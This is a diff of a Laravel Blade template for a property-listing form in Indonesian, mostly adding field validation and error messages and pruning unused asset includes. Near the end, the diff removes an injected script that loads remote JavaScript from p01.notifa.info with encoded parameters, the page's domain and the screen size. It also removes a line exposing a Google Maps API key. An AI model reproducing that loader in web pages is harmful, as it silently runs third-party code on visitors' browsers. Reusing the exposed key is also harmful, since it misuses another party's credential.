@@ -17,18 +17,7 @@
   <!-- External Css -->
   <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
   <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/magnific-popup.css')}}" />
-  <link rel="stylesheet" href="{{asset('assets/css/js-flickr-gallery.css')}}" />
 
-  <!-- leaflet -->
-  <link rel="stylesheet" href="{{asset('assets/leaflet/css/leaflet.css')}}">
-  <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.css')}}">
-  <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.Default.css')}}">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Dropify/0.2.2/css/dropify.min.css">
 
   <!-- Custom Css -->
@@ -39,9 +28,6 @@
 
   <!-- Favicon -->
   <link rel="icon" href="{{asset('images/favicon.png')}}">
-  <link rel="apple-touch-icon" href="{{asset('images/apple-touch-icon.png')}}">
-  <link rel="apple-touch-icon" sizes="72x72" href="{{asset('images/icon-72x72.png')}}">
-  <link rel="apple-touch-icon" sizes="114x114" href="{{asset('images/icon-114x114.png')}}">
 
   <script src="https://cdn.tiny.cloud/1/no-api-key/tinymce/5/tinymce.min.js" referrerpolicy="origin"></script>
   <script>
@@ -85,56 +71,96 @@
                       <div class="col-xs-12">
                         <div class="form-group">
                           <label for="title">Judul</label>
-                          <input id="title" name="title" type="text" value="{{old('title')}}" class="form-control">
+                          <input id="title" name="title" type="text" value="{{old('title')}}" @error('title') style="border-color: red" @enderror class="form-control" required>
+                          @error('title')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
 
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="surface_area">Luas Tanah</label>
-                          <input id="surface_area" name="surface_area" type="number" class="form-control" value="{{old('surface_area')}}" placeholder="Dalam satuan meter persegi" aria-required="true">
+                          <input id="surface_area" name="surface_area" type="number" class="form-control" @error('surface_area') style="border-color: red" @enderror value="{{old('surface_area')}}" placeholder="Dalam satuan meter persegi" required>
+                          @error('surface_area')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="building_area">Luas Bangunan</label>
-                          <input id="building_area" name="building_area" type="number" class="form-control" value="{{old('building_area')}}" placeholder="Dalam satuan meter persegi" aria-required="true">
+                          <input id="building_area" name="building_area" type="number" class="form-control" @error('building_area') style="border-color: red" @enderror value="{{old('building_area')}}" placeholder="Dalam satuan meter persegi" required>
+                          @error('building_area')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="location">Lokasi</label>
-                          <input id="location" name="location" type="text" class="form-control" value="{{old('location')}}" placeholder="" aria-required="true">
+                          <input id="location" name="location" type="text" class="form-control" @error('location') style="border-color: red" @enderror value="{{old('location')}}" placeholder="" required>
+                          @error('location')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="direction">Arah hadap</label>
-                          <input id="direction" name="direction" type="text" class="form-control" value="{{old('direction')}}" placeholder="Barat,Timur dll" aria-required="true">
+                          <input id="direction" name="direction" type="text" class="form-control" value="{{old('direction')}}" @error('direction') style="border-color: red" @enderror placeholder="Barat,timur dll" required>
+                          @error('direction')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="bathroom">Kamar Mandi</label>
-                          <input id="bathroom" name="bathroom" type="number" class="form-control" value="{{old('bathroom')}}" placeholder="" aria-required="true">
+                          <input id="bathroom" name="bathroom" type="number" class="form-control" @error('bathroom') style="border-color: red" @enderror value="{{old('bathroom')}}" placeholder="" required>
+                          @error('bathroom')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="bedroom">Kamar Tidur</label>
-                          <input id="bedroom" name="bedroom" type="number" class="form-control" value="{{old('bedroom')}}" placeholder="" aria-required="true">
+                          <input id="bedroom" name="bedroom" type="number" class="form-control" value="{{old('bedroom')}}" @error('bedroom') style="border-color: red" @enderror placeholder="" required>
+                          @error('bedroom')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="price">Harga</label>
-                          <input id="price" name="price" type="number" class="form-control" value="{{old('price')}}" placeholder="" aria-required="true">
+                          <input id="price" name="price" type="number" class="form-control" value="{{old('price')}}" @error('price') style="border-color: red" @enderror placeholder="" required>
+                          @error('price')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
                       <div class="col-sm-6">
                         <div class="form-group">
                           <label for="value">Satuan Harga</label>
-                          <select id="value" name="value" class="form-control">
+                          <select id="value" name="value" class="form-control" required>
                             <option value="JT" {{old('value') == "JT" ? 'selected' : ''}}>Juta</option>
                             <option value="M" {{old('value') == "M" ? 'selected' : ''}}>Miliar</option>
                           </select>
@@ -144,7 +170,7 @@
                       <div class="col-sm-6">
                         <div class="form-group">
                           <label for="type_id">Tipe Rumah</label>
-                          <select id="type_id" name="type_id" class="form-control">
+                          <select id="type_id" name="type_id" class="form-control" required>
                             @foreach ($types as $type)
                             <option value="{{$type->id}}" {{old('type_id') == $type->id ? 'selected' : ''}}>{{$type->name}}</option>
                             @endforeach
@@ -155,7 +181,7 @@
                       <div class="col-sm-6">
                         <div class="form-group">
                           <label for="status_id">Status</label>
-                          <select id="status_id" name="status_id" class="form-control">
+                          <select id="status_id" name="status_id" class="form-control" required>
                             @foreach ($status as $s)
                             <option value="{{$s->id}}" {{old('status_id') == $s->id ? 'selected' : ''}}>{{$s->name}}</option>
                             @endforeach
@@ -166,42 +192,72 @@
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="electricity">Listrik</label>
-                          <input id="electricity" name="electricity" value="{{old('electricity')}}" type="number" class="form-control" placeholder="Satuan Watt" aria-required="true">
+                          <input id="electricity" name="electricity" value="{{old('electricity')}}" type="number" class="form-control" placeholder="Dalam satuan watt" @error('electricity') style="border-color: red" @enderror required>
+                          @error('electricity')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="water">Sumber Air</label>
-                          <input id="water" name="water" type="text" value="{{old('water')}}" class="form-control" placeholder="" aria-required="true">
+                          <input id="water" name="water" type="text" value="{{old('water')}}" class="form-control" @error('water') style="border-color: red" @enderror placeholder="" required>
+                          @error('water')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="legality">Legalitas</label>
-                          <input id="legality" name="legality" value="{{old('legality')}}" type="text" class="form-control" placeholder="" aria-required="true">
+                          <input id="legality" name="legality" value="{{old('legality')}}" @error('legality') style="border-color: red" @enderror type="text" class="form-control" placeholder="" required>
+                          @error('legality')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="garage">Garasi</label>
-                          <input id="garage" name="garage" value="{{old('garage')}}" type="number" class="form-control" placeholder="" aria-required="true">
+                          <input id="garage" name="garage" value="{{old('garage')}}" @error('garage') style="border-color: red" @enderror type="number" class="form-control" placeholder="" required>
+                          @error('garage')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="name">Nama</label>
-                          <input id="name" name="name" type="text" value="{{old('name')}}" class="form-control" placeholder="" aria-required="true">
+                          <input id="name" name="name" type="text" value="{{old('name')}}" @error('name') style="border-color: red" @enderror class="form-control" placeholder="" required>
+                          @error('name')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
                       <div class="col-lg-6">
                         <div class="form-group">
                           <label for="phone_number">Nomor Handphone Pemilik</label>
-                          <input id="phone_number" name="phone_number" type="text" value="{{old('phone_number')}}" class="form-control" placeholder="" aria-required="true">
+                          <input id="phone_number" name="phone_number" type="text" value="{{old('phone_number')}}" @error('phone_number') style="border-color: red" @enderror class="form-control" placeholder="" required>
+                          @error('phone_number')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
@@ -209,7 +265,12 @@
                       <div class="col-xs-12">
                         <div class="form-group listing-compose-block">
                           <label for="mytextarea">Description</label>
-                          <textarea name="description" id="mytextarea" rows="20" class="tinymce-editor">{{old('description')}}</textarea>
+                          <textarea required name="description" id="mytextarea" rows="20" class="tinymce-editor">{{old('description')}}</textarea>
+                          @error('description')    
+                            <div style="color:red">
+                              {{$message}}
+                            </div>
+                          @enderror
                         </div>
                       </div>
 
@@ -217,18 +278,21 @@
                         <div class="form-group">
                           <label for="">Foto 1</label>
                           <input type="file" name="photo[]" data-max-file-size="2M" class="dropify" />
+                          <span>*Wajib diisi</span>
                         </div>
                       </div>
                       <div class="col-lg-4">
                         <div class="form-group">
                           <label for="">Foto 2</label>
                           <input type="file" name="photo[]" data-max-file-size="2M" class="dropify" />
+                          <span>*Opsional</span>
                         </div>
                       </div>
                       <div class="col-lg-4">
                         <div class="form-group">
                           <label for="">Foto 3</label>
                           <input type="file" name="photo[]" data-max-file-size="2M" class="dropify" />
+                          <span>*Opsional</span>
                         </div>
                       </div>
 
@@ -444,54 +508,7 @@
   <script src="{{asset('assets/js/jquery.min.js')}}"></script>
   <!-- Include all compiled plugins (below), or include individual files as needed -->
   <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
-  <script src="{{asset('assets/js/visible.js')}}"></script>
-  <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
-  <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
-  <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
-  <script src="{{asset('assets/js/plyr.js')}}"></script>
-  <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
-  <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
-  <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
-  <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
-  <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
-  <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>
-
-  <!-- leaflet -->
-  <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
-  <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
-  <script src="{{asset('assets/leaflet/js/leaflet.markercluster-src.js')}}"></script>
-
-  <script src="{{asset('js/custom.js')}}"></script>
   <script src="{{asset('js/dashboard.js')}}"></script>
-  <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
-  <script src="{{asset('js/map.js')}}"></script>
-  <script src="{{asset('js/searchMap.js')}}"></script>
-  <script type="text/javascript">
-    if (self == top) {
-      function netbro_cache_analytics(fn, callback) {
-        setTimeout(function() {
-          fn();
-          callback();
-        }, 0);
-      }
-
-      function sync(fn) {
-        fn();
-      }
-
-      function requestCfs() {
-        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-        var idc_glo_r = Math.floor(Math.random() * 99999999999);
-        var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pJDmtm%2bxesmo0ZMegSCb3JUanBtEhdW961ElByTx5MQ7%2fU%2bOg4Fax2kO31n84DP%2fSTsLMgvIn3nLbHhFfmJSOYL0y87kzBB65nkxrkPX9h8TMwxWZbjB0M1nJ8WzSHL%2b6lBfZ9fu5vSJRt02cACRflXTaMdV54%2fV0Pr3T2IdZoluJzo%2bKL%2boyrgs2%2boVAeh5WYOEI1xe%2fnum%2b%2fVLwdWk6Vevxl7gT%2bTZRvK78z6YHTfvF15OEVaMKulwH2d247SGLryumOYnHLbVfqvtKD5pdgTCK8%2bQlj0l%2f38YC%2ftZCtVi0XvuucUfpF%2bjMiAfjfkeqoSvWNPxRXm2QSd04yqnT8Fq8Jiiv6tMexsII%2b%2fw%2fYT3X2waWyGl3d1CDxC4FHecYVjXmPhVznPcZGKbWWbwNO8F4jBGaZvz%2bssmA4XVsaSKe5tGKMzD040yZZfD45CBrGKuesiRL%2fEzcERKKa2ZfZv%2bVNJPnelz1vAmtv8oK%2fzV6u4trWOFVU4Zk9ZpjDS9TQ%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-        var bsa = document.createElement('script');
-        bsa.type = 'text/javascript';
-        bsa.async = true;
-        bsa.src = url;
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-      }
-      netbro_cache_analytics(requestCfs, function() {});
-    };
-  </script>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/Dropify/0.2.2/js/dropify.min.js"></script>
 
